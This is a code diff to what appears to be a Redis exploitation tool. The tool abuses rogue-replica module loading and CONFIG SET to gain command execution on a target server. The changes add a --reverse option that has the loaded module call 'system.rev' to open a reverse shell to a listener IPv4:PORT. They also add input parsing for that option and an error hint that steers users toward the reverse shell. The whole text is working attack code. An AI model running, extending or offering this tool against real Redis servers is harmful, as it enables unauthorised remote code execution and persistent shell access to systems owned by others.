@@ -169,14 +169,27 @@ def interactive(client):
             print(f"[>>] {output if output else '(no stdout)'}")
 
 
-def reverse(client):
-    host = input("Listener IPv4: ").strip()
-    port = int(input("Listener port: ").strip())
+def parse_listener(value):
+    try:
+        host, port_text = value.rsplit(":", 1)
+        port = int(port_text)
+    except ValueError as exc:
+        raise ValueError("Listener must be numeric IPv4:PORT") from exc
     socket.inet_pton(socket.AF_INET, host)
     if not 1 <= port <= 65535:
         raise ValueError("Listener port must be 1..65535")
+    return host, port
+
+
+def launch_reverse(client, host, port):
     checked(client, "system.rev", host, str(port))
     print("[info] Request accepted; verify the connection at your listener")
+
+
+def reverse(client):
+    host = input("Listener IPv4: ").strip()
+    port = input("Listener port: ").strip()
+    launch_reverse(client, *parse_listener(f"{host}:{port}"))
 
 
 def run(args):
@@ -186,6 +199,7 @@ def run(args):
         raise ValueError(f"{path} is not an ELF module; run make on Linux")
     if not args.directory.startswith("/") or args.directory == "/":
         raise ValueError("--dir must be an absolute writable target directory other than /")
+    listener = parse_listener(args.reverse) if args.reverse is not None else None
     client = RedisClient(args.rhost, args.rport, args.passwd, args.verbose)
     changed = {"dir": False, "dbfilename": False, "replica": False, "module": False}
     cleanup_errors = []
@@ -244,7 +258,9 @@ def run(args):
             checked(client, "CONFIG", "SET", "dir", original_dir)
             changed["dir"] = False
 
-        if args.command is not None:
+        if listener is not None:
+            launch_reverse(client, *listener)
+        elif args.command is not None:
             print(client.command("system.exec", args.command))
         else:
             while True:
@@ -258,7 +274,14 @@ def run(args):
                 else:
                     print("[info] Choose i, r, or q")
     except BaseException as exc:
-        failure = exc
+        if isinstance(exc, TimeoutError):
+            failure = RedisError(
+                "Redis timed out. A long-running system.exec command can block "
+                "the Redis event loop. Close that shell, inspect target cleanup, "
+                "and use --reverse IPv4:PORT for a reverse shell."
+            )
+        else:
+            failure = exc
     finally:
         if master is not None:
             master.close()
@@ -296,7 +319,9 @@ def main():
     parser.add_argument("--dir", dest="directory", default="/tmp",
                         help="writable target directory (default: /tmp)")
     parser.add_argument("--passwd", help="target Redis password, if configured")
-    parser.add_argument("--command", help="run one command and exit")
+    operation = parser.add_mutually_exclusive_group()
+    operation.add_argument("--command", help="run one finite command and exit")
+    operation.add_argument("--reverse", help="request a nonblocking reverse shell at IPv4:PORT")
     parser.add_argument("-v", "--verbose", action="store_true", help="show Redis replies")
     args = parser.parse_args()
     try:
